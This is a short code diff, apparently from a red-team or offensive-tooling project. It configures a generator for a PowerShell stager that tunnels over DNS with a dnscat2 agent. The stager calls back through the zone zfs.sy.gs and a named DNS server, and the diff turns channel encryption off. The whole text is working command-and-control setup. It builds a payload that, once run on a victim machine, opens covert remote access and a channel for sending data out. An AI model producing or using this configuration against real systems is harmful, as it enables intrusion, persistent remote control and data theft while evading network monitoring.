@@ -21,7 +21,7 @@ handler.setoption("PLATFORM", "POWERSHELL")
 
 handler.setoption("TRANSPORT", "DNS")
 #handler.setoption("AGENTTYPE", "DNSCAT2")
-handler.setoption("AGENTTYPE", "DNSCAT2DOWNLOADER")
+#handler.setoption("AGENTTYPE", "DNSCAT2DOWNLOADER")
 handler.setoption("ZONE", "zfs.sy.gs")
 handler.setoption("DNSSERVER", "10.201.1.83")
 #handler.setoption("DNSTYPE", "A")
@@ -34,6 +34,7 @@ handler.setoption("DNSSERVER", "10.201.1.83")
 
 #handler.setoption("STAGEENCODING", "FALSE")
 #handler.setoption("STAGEAUTHENTICATION", "FALSE")
+handler.setoption("CHANNELENCRYPTION", "NONE")
 
 handler.generatestager()
 
